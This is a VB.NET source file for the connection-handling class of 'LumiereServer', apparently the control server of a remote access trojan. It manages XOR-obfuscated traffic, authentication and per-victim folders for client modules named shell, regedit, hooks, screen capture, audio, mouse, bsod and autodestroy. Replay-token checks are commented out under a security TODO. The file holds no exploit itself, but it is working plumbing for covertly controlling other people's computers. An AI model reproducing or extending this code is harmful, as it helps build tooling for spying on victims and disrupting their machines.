' ***********************************************************************
' Assembly         : LumiereServer
' Author           : rezni
' Created          : 06-12-2020
'
' Last Modified By : rezni
' Last Modified On : 06-11-2020
' ***********************************************************************
' <copyright file="ClientInstance.vb" company="LumiereSombre | HorizonDova">
'     Copyright ©  LumiereSombre Inc. 2020
' </copyright>
' <summary></summary>
' ***********************************************************************
Imports System.IO
Imports System.Net.Sockets
Imports System.Threading
Imports System.Collections.Concurrent

''' <summary>
''' Class ClientInstance.
''' </summary>
Public Class ClientInstance
    ''' <summary>
    ''' The usrdescriptor
    ''' </summary>
    Public usrdescriptor As userdescriptor = Nothing
    ''' <summary>
    ''' The flash recv timeout
    ''' </summary>
    Public flashRecvTimeout As Integer = 5000
    ''' <summary>
    ''' The socket
    ''' </summary>
    Public socket As TcpClient = Nothing
    ''' <summary>
    ''' The working path i.e current durectory of client's resources path.
    ''' </summary>
    Public workingPath As String
    ''' <summary>
    ''' The ip of the client.
    ''' </summary>
    Public ip As String

    ''' <summary>
    ''' Called when packet is received.
    ''' </summary>
    Private onReceiveCallback As Func(Of ClientInstance, com_packet, Boolean)
    ''' <summary>
    ''' Called on client destruction.
    ''' </summary>
    Private onDestroyCallback As Func(Of ClientWrapper, ClientInstance, Boolean)

    ''' <summary>
    ''' Syncr. socket tasks performed on this thread.
    ''' </summary>
    Private thread_receive_handle As Thread = Nothing
    ''' <summary>
    ''' The thread that handles authentification.
    ''' </summary>
    Public threadAuthentificate As Thread

    ''' <summary>
    ''' Client destroyed flag.
    ''' </summary>
    Private destroyed As Boolean = False
    ''' <summary>
    ''' No concurrency issues if threads decide simultaniously to destroy client.
    ''' </summary>
    Private destroy_lock As New Object()
    ''' <summary>
    ''' A wrapper object that collects instances of different modules that belong to one client in one place.
    ''' </summary>
    Private parentClientWrapper As ClientWrapper


    ''' <summary>
    ''' Authentification stage:     
    ''' 0 default
    ''' 1 not authentificated
    ''' 2 authentificated
    ''' </summary>
    Public authentificated As Integer = 0

    ''' <summary>
    ''' Handle a client debug msg stream.
    ''' </summary>
    Private debugMessage As Action(Of String, Integer)

    ''' <summary>
    ''' Client's specific tokenizer.
    ''' </summary>
    Private token_generator As New Tokenizer

    ''' <summary>
    ''' The error concurrent queue
    ''' </summary>
    Private errorConcurrentQueue As New ConcurrentQueue(Of String)

    ''' <summary>
    ''' Dictionary of registered tokens.
    ''' </summary>
    Private token_dictionary As New Dictionary(Of String, TokenData)

    ''' <summary>
    ''' Data about a token
    ''' </summary>
    Private Structure TokenData
        ''' <summary>
        ''' The timestamp
        ''' </summary>
        Dim timestamp As DateTime
        ''' <summary>
        ''' The onetime use
        ''' </summary>
        Dim onetime_use As Boolean
        ''' <summary>
        ''' The datatype
        ''' </summary>
        Dim datatype As Integer
    End Structure



#Region "Tcp_Client___Main_Methods_Declarations"

    ''' <summary>
    ''' Initializes a new instance of the <see cref="ClientInstance"/> class.
    ''' </summary>
    ''' <param name="client">The client.</param>
    Public Sub New(ByVal client As TcpClient)
        socket = client

        workingPath = ""

        If Not client Is Nothing Then
            ip = socket.Client.RemoteEndPoint.ToString.Split(":")(0)
        End If
    End Sub


    ''' <summary>
    ''' Starts the client thread.
    ''' </summary>
    Public Sub start_client_component()
        If thread_receive_handle Is Nothing Then
            thread_receive_handle = New Thread(
                 New ParameterizedThreadStart(
                 AddressOf receive_callback_internal_message_filter)) With
                 {
                 .Name = "Server_Generated_Thread" + usrdescriptor.client_type.ToString,
                 .IsBackground = True
                 }

            thread_receive_handle.Start()
        End If
    End Sub

    ''' <summary>
    ''' Destroys this instance.
    ''' </summary>
    Public Sub destroy()
        ''''Induce a comma type destroy
        SyncLock destroy_lock
            If Not destroyed Then
                destroyed = True    'We are now responsible for the destroy callback

                If parentClientWrapper IsNot Nothing Then onDestroyCallback(parentClientWrapper, Me)

                Try
                    socket.Client.Shutdown(SocketShutdown.Both)
                Catch ex As Exception
                    ' Nothing to catch here.
                End Try
            End If
        End SyncLock
    End Sub

    ''' <summary>
    ''' If the GC decides this object should be destroyed then take care of releasing valuable resources.
    ''' </summary>
    Protected Overrides Sub Finalize()
        If parentClientWrapper IsNot Nothing Then parentClientWrapper.isUIConnected = False
        destroy()
    End Sub

#End Region



#Region "Tcp_Client___Sending_Protocol_Definitions"

    ''' <summary>
    ''' Pings the protocol.
    ''' </summary>
    ''' <returns><c>true</c> if sent, <c>false</c> otherwise.</returns>
    Public Function ping_protocol() As Boolean
        '''' ping will send only a header with 0 bytes promised
        '''' ping will receive only a header as repsone with datattype = ping_aknowledged

        Dim multiPurposePacket As com_packet

        If Not send_header(dataTypes.ping_send, 0, multiPurposePacket) Then
            setLastError("ping_protocol->send_header failed")
            Return False
        End If

        Return True
    End Function

    ''' <summary>
    ''' Sends the specified byte buffer with details set in com_packet.
    ''' </summary>
    ''' <param name="buffer">The buffer.</param>
    ''' <param name="_packet">The packet.</param>
    ''' <returns><c>true</c> if sent, <c>false</c> otherwise.</returns>
    Public Function send(ByRef buffer() As Byte, ByRef _packet As com_packet) As Boolean
        Return send(buffer, _packet.packetSize)
    End Function

    ''' <summary>
    ''' Sends the specified buffer of specified uint64 size.
    ''' </summary>
    ''' <param name="buffer">The buffer.</param>
    ''' <param name="cbSize">Size of the cb.</param>
    ''' <returns><c>true</c> if socket.Client.Send <c>false</c> otherwise.</returns>
    Public Function send(ByRef buffer() As Byte, ByVal cbSize As UInt64) As Boolean
        Dim sendLen As UInt64 = 0
        Dim originalExpectedSize As UInt64 = cbSize
        Dim offset As UInt64 = 0

        Try
            While cbSize > 0
                sendLen = socket.Client.Send(buffer, offset, cbSize, 0)

                If sendLen < 1 Then
                    setLastError("send->" + Convert.ToString(originalExpectedSize - cbSize) + ", totalToSend:" + Convert.ToString(originalExpectedSize))
                    Return False
                End If

                offset += sendLen
                cbSize -= sendLen
            End While
        Catch ex As Exception
            setLastError("send->" + Convert.ToString(originalExpectedSize - cbSize) + ", totalToSend:" + Convert.ToString(originalExpectedSize) + ", exception: " + ex.Message)
            Return False
        End Try

        Return True
    End Function

    ''' <summary>
    ''' Sends the header with details set in com_packet.Higher level function.
    ''' </summary>
    ''' <param name="dataType">Type of the data.</param>
    ''' <param name="packetSize">Size of the packet.</param>
    ''' <param name="sPacket">The s packet.</param>
    ''' <returns><c>true</c> if send_header <c>false</c> otherwise.</returns>
    Public Function send_header(ByVal dataType As Int32, ByVal packetSize As UInt64, ByRef sPacket As com_packet) As Boolean
        Return send_header(dataType, packetSize, "", sPacket)
    End Function

    ''' <summary>
    ''' Sends the header low level version. Xors the data and sets token flags.
    ''' </summary>
    ''' <param name="dataType">Type of the data.</param>
    ''' <param name="packetSize">Size of the packet.</param>
    ''' <param name="arguments">The arguments.</param>
    ''' <param name="sPacket">The s packet.</param>
    ''' <returns><c>true</c> if sent, <c>false</c> otherwise.</returns>
    Public Function send_header(ByVal dataType As Int32, ByVal packetSize As UInt64, ByRef arguments As String, ByRef sPacket As com_packet) As Boolean
        sPacket.magicStart = MAGIC_START
        sPacket.dataType = dataType
        sPacket.packetSize = packetSize
        sPacket.arguments = arguments
        sPacket.checksum = computeChecksum(sPacket)
        sPacket.token = token_generator.token_generate()

        Dim token_info As TokenData

        With token_info
            .datatype = dataType
            .timestamp = DateTime.UtcNow

            Select Case dataType
                Case dataTypes.video_frame
                    .onetime_use = False
                Case dataTypes.shell
                    .onetime_use = False
                Case Else
                    .onetime_use = True
            End Select
        End With

        token_dictionary.Add(sPacket.token, token_info)

        Dim bufferedPacket() As Byte = convertPacketToStream(sPacket)

        xor_ize_packet(bufferedPacket)

        Return send(bufferedPacket, szOfPacket)
    End Function

    ''' <summary>
    ''' Handles part of authentification. Fills updatedUserDescriptor.
    ''' </summary>
    ''' <param name="updatedUserDescriptor">The updated user descriptor.</param>
    ''' <returns><c>true</c> if socket communication worked, <c>false</c> otherwise.</returns>
    Public Function authentificate(Optional updatedUserDescriptor As userdescriptor = Nothing) As Boolean
        Dim buffer(szOfUserDescriptor) As Byte
        Dim mpacket As com_packet = Nothing
        Dim randomUID As String = ""
        Dim syncDate As Date = Date.Now

        Dim isThisAnUpdate As Boolean = IIf(updatedUserDescriptor Is Nothing, False, True)

        If Not isThisAnUpdate Then
            '''' Declare a new userdescriptor for this client
            usrdescriptor = New userdescriptor

            '''' Genereate new data for the userdescriptor
            randomUID = generateRandomUID()

            '''' Assign a random id. This may be changed on receive if the user has been registered before
            usrdescriptor.unique_id = randomUID

            '''' Set a timout receive for the first auth packet.
            set_receive_timeout(flashRecvTimeout)
        Else
            '''' This is the updated user descriptor
            usrdescriptor = updatedUserDescriptor
        End If



        If Not send_header(dataTypes.authentificate, szOfUserDescriptor, mpacket) Then
            setLastError("authentificate->send_header failed")
            Return False
        End If

        If Not send(convertUserDescriptorToStream(usrdescriptor), mpacket) Then
            setLastError("authentificate->send data failed")
            Return False
        End If

        '''' Code flow: the first time an user connects I send him a userdescriptor
        '''' and wait for a userdescriptor back again.
        '''' The second time this function is used is when I want to update a specific field
        '''' in the userdescriptor. But now I can no longer wait to receive something
        '''' because until now this client has succesfully authentificated and therefore
        '''' a receiving thread has been assigned to it, and receiving in paralel from multiple
        '''' threads without a safety mechanism is not wise.
        If Not isThisAnUpdate Then
            Dim dateDependency As String = syncDate.Day.ToString + "_" + syncDate.Month.ToString + "_" + syncDate.Year.ToString

            If Not receive_header(mpacket) Then
                setLastError("authentificate->receive_header failed")
                Return False
            End If

            If Not mpacket.dataType = dataTypes.authentificate Then
                setLastError("authentificate->expected authentificate packet not received")
                Return False
            End If

            If Not receive(buffer, mpacket) Then
                setLastError("authentificate->receive data failed")
                Return False
            End If

            set_receive_timeout(Int32.MaxValue)


            ' Registering a safe version of the received data.
            usrdescriptor = getUserDescriptorFromStream(buffer)

            workingPath = resourcesPath + usrdescriptor.user_name + "_" + randomUID

            workingPath = "Resources\" + usrdescriptor.user_name + "_" + usrdescriptor.unique_id + "\" + dateDependency + "\"

            workingPath = workingPath.Replace(" ", "_")

            If Not Directory.Exists(workingPath) Then Directory.CreateDirectory(workingPath)

        End If
        Return True
    End Function


#End Region




#Region "Tcp_Client___Receiving_Protocol_Definitions"

    ''' <summary>
    ''' Receives the specified buffer.
    ''' </summary>
    ''' <param name="buffer">The buffer.</param>
    ''' <param name="_packet">The packet.</param>
    ''' <returns><c>true</c> if received <c>false</c> otherwise.</returns>
    Public Function receive(ByRef buffer() As Byte, ByRef _packet As com_packet) As Boolean
        Return receive(buffer, _packet.packetSize)
    End Function

    ''' <summary>
    ''' Receives the specified buffer.
    ''' </summary>
    ''' <param name="buffer">The buffer.</param>
    ''' <param name="cbSize">Size of the cb.</param>
    ''' <returns><c>true</c> if received, <c>false</c> otherwise.</returns>
    Public Function receive(ByRef buffer() As Byte, ByVal cbSize As UInt64) As Boolean
        Dim recvlen As UInt64 = 0
        Dim originalExpectedSize As UInt64 = cbSize
        Dim offset As UInt64 = 0

        Try
            While cbSize > 0
                recvlen = socket.Client.Receive(buffer, offset, cbSize, SocketFlags.None)

                If recvlen < 1 Then
                    setLastError("receive->" + Convert.ToString(originalExpectedSize - cbSize) + ", totalToRecieve:" + Convert.ToString(originalExpectedSize))
                    Return False
                End If

                offset += recvlen
                cbSize -= recvlen
            End While
        Catch ex As Exception
            setLastError("receive->" + Convert.ToString(originalExpectedSize - cbSize) + ", totalToRecieve:" + Convert.ToString(originalExpectedSize) + ", exception: " + ex.Message)
            Return False
        End Try

        Return True
    End Function

    ''' <summary>
    ''' Receives data according to om_packet in chunks in a controlled environment. Calls the calllback for each sub packet
    ''' </summary>
    ''' <param name="sAddress">The buffer address.</param>
    ''' <param name="rPacket">Packet details.</param>
    ''' <param name="cbFragBytes">Count bytes received</param>
    ''' <param name="fragReceivalCallback">The fragment received callback.</param>
    ''' <returns><c>true</c> if received, <c>false</c> otherwise.</returns>
    Public Function receive_fragmented(ByVal sAddress() As Byte, ByVal rPacket As com_packet, ByVal cbFragBytes As UInt64, ByVal fragReceivalCallback As Func(Of UInt64, Boolean)) As Boolean
        Dim tcbBytes As UInt64 = 0

        While tcbBytes < rPacket.packetSize
            Dim minSize As Int32 = Math.Min(rPacket.packetSize - tcbBytes, cbFragBytes)

            If Not receive(sAddress, minSize) Then Return False

            If Not fragReceivalCallback(minSize) Then Return False

            tcbBytes += minSize
        End While

        Return True
    End Function

    ''' <summary>
    ''' Receives a header pushed on the stack.
    ''' </summary>
    ''' <param name="ccmPacket">The CCM packet to write into.</param>
    ''' <returns><c>true</c> if received, <c>false</c> otherwise.</returns>
    Public Function receive_header(ByRef ccmPacket As com_packet) As Boolean
        Dim bufferedPacket(szOfPacket) As Byte

        If Not receive(bufferedPacket, szOfPacket) Then
            setLastError("receive_header->receive data failed")
            Return False
        End If

        xor_ize_packet(bufferedPacket)

        ccmPacket = getPacketFromStream(bufferedPacket)

        If Not ccmPacket.magicStart = MAGIC_START Then
            setLastError("receive_header->wrong MAGIC_START")
            Return False
        End If


        Dim mComputedChecksum As UInt64 = computeChecksum(ccmPacket)

        If Not mComputedChecksum = ccmPacket.checksum Then
            setLastError("receive_header->wrong checksum")
            Return False
        End If


        If Not (ccmPacket.dataType = dataTypes.tcp_error_debugging Or ccmPacket.dataType = dataTypes.com_error_debugging) Then
            Dim token_info As TokenData

            '   If Not token_dictionary.TryGetValue(ccmPacket.token, token_info) Then Return False

            '''' TODO : fix this place up. - find a solution for this security issue
            If token_info.onetime_use Then
                'token_dictionary.Remove(ccmPacket.token)

                'If (token_info.timestamp < DateTime.UtcNow.AddSeconds(-200)) Then Return False
            End If
        End If

        Return True
    End Function



    ''' <summary>
    ''' Thread that handles the authentification process.
    ''' </summary>
    Public Sub threadAuthentificateFunc()

        If authentificate() Then
            Interlocked.Add(authentificated, 2)

        Else
            Interlocked.Add(authentificated, 1)

            SyncLock destroy_lock
                destroyed = True
                socket.Close()
                socket = Nothing
            End SyncLock
        End If

        For Each errorItem As String In errorConcurrentQueue
            ' Dump all messages collected during authentification.
            debugMessage(errorItem, informationcode.error)
        Next
    End Sub

    ''' <summary>
    ''' This method low parses the data to capture low level events with regard to the ArcherTcp protocol
    ''' </summary>
    Private Sub receive_callback_internal_message_filter()

        Dim rPacket As com_packet

        While receive_header(rPacket)
            '''' Filter important packet here.

            Select Case rPacket.dataType
                Case dataTypes.ping_aknowledged
                    Continue While
                Case dataTypes.tcp_error_debugging, dataTypes.com_error_debugging
                    Dim err_param As String = rPacket.getPacketParamValue("err")

                    debugMessage(err_param, informationcode.error)

                    Continue While
            End Select

            If Not onReceiveCallback(Me, rPacket) Then Exit While

        End While


        For Each errorItem As String In errorConcurrentQueue
            debugMessage(errorItem, informationcode.error)
        Next

        SyncLock destroy_lock
            If Not destroyed Then
                destroyed = True

                If parentClientWrapper IsNot Nothing Then onDestroyCallback(parentClientWrapper, Me)

                socket.Close()
                socket = Nothing
            End If
        End SyncLock
    End Sub

#End Region



#Region "Tcp_Client___Method_Getters"

    ''' <summary>
    ''' Gets the user descriptor.
    ''' </summary>
    ''' <returns>userdescriptor.</returns>
    Public Function get_user_descriptor() As userdescriptor
        Return usrdescriptor
    End Function

    ''' <summary>
    ''' Gets the type of the client.
    ''' Will be filled if the authentificate method succeds
    ''' otherwise is nothing.
    ''' </summary>
    ''' <returns>System.Int32.</returns>
    Public Function get_client_type() As Integer
        Return usrdescriptor.client_type
    End Function

    ''' <summary>
    ''' Gets the client type string.
    ''' </summary>
    ''' <returns>System.String.</returns>
    Public Function get_client_type_string() As String
        Dim stringified As String = "NaN"

        Select Case usrdescriptor.client_type
            Case clientTypes.audio
                stringified = "audio"
            Case clientTypes.autodestroy
                stringified = "autodestroy"
            Case clientTypes.bsod
                stringified = "bsod"
            Case clientTypes.ftp
                stringified = "ftp"
            Case clientTypes.hooks
                stringified = "hooks"
            Case clientTypes.shell
                stringified = "shell"
            Case clientTypes.upload_manager
                stringified = "upload_manager"
            Case clientTypes.download_manager
                stringified = "download_manager"
            Case clientTypes.regedit
                stringified = "regedit"
            Case clientTypes.screenCapture
                stringified = "video"
            Case clientTypes.mouse
                stringified = "mouse"
        End Select

        Return stringified
    End Function

    ''' <summary>
    ''' Gets the system unique identifier.
    ''' </summary>
    ''' <returns>System.String.</returns>
    Public Function get_system_id() As String
        Return usrdescriptor.user_name + " :: " + usrdescriptor.unique_id
    End Function

    ''' <summary>
    ''' Override ToString
    ''' </summary>
    ''' <returns>System.String.</returns>
    Public Function get_to_string() As String
        Dim stringified As String

        If authentificated = 2 Then
            stringified = usrdescriptor.user_name + " of type " + get_client_type_string()
        Else
            stringified = ip
        End If

        Return stringified
    End Function

    ''' <summary>
    ''' Gets the last errors.
    ''' </summary>
    ''' <returns>ConcurrentQueue(Of System.String).</returns>
    Private Function getLastErrors() As ConcurrentQueue(Of String)
        Return errorConcurrentQueue
    End Function
#End Region



#Region "Tcp_Client___Method_Setters"

    ''' <summary>
    ''' Sets the last error.
    ''' </summary>
    ''' <param name="errorString">The error string.</param>
    Private Sub setLastError(ByVal errorString As String)
        errorConcurrentQueue.Enqueue(get_client_type_string() + "::" + errorString)
    End Sub

    ''' <summary>
    ''' Sets the debugging slot. Callback method.
    ''' </summary>
    ''' <param name="mDebuggingFunction">The m debugging function.</param>
    Public Sub set_debugging_slot(ByVal mDebuggingFunction As Action(Of String, Integer))
        debugMessage = mDebuggingFunction
    End Sub

    ''' <summary>
    ''' Sets the receive timeout.
    ''' </summary>
    ''' <param name="tmt">The TMT.</param>
    ''' <returns>System.Int32.</returns>
    Public Function set_receive_timeout(ByVal tmt As Integer) As Integer
        Dim bkTimeout As Integer = socket.Client.ReceiveTimeout

        socket.Client.ReceiveTimeout = tmt

        Return bkTimeout
    End Function

    ''' <summary>
    ''' Sets the send timeout.
    ''' </summary>
    ''' <param name="tmt">The TMT.</param>
    ''' <returns>System.Int32.</returns>
    Public Function set_send_timeout(ByVal tmt As Integer) As Integer
        Dim bkTimeout As Integer = socket.Client.SendTimeout

        socket.Client.SendTimeout = tmt

        Return bkTimeout
    End Function

    ''' <summary>
    ''' Sets the on receive callback. For the packet to be forwarded.
    ''' </summary>
    ''' <param name="onrecv">The onrecv.</param>
    Public Sub set_on_receive(ByVal onrecv As Func(Of ClientInstance, com_packet, Boolean))
        onReceiveCallback = onrecv
    End Sub

    ''' <summary>
    ''' Sets the on destroy callback. For the packet to be forwarded.
    ''' </summary>
    ''' <param name="ondestr">The ondestr.</param>
    Public Sub set_on_destroy(ByVal ondestr As Func(Of ClientWrapper, ClientInstance, Boolean))
        onDestroyCallback = ondestr
    End Sub

    ''' <summary>
    ''' Sets the parrent wrapper. Now this client module belongs to a higher class.
    ''' </summary>
    ''' <param name="clWrapper">The cl wrapper.</param>
    Public Sub set_parrent_wrapper(ByVal clWrapper As ClientWrapper)
        parentClientWrapper = clWrapper
    End Sub

#End Region




End Class
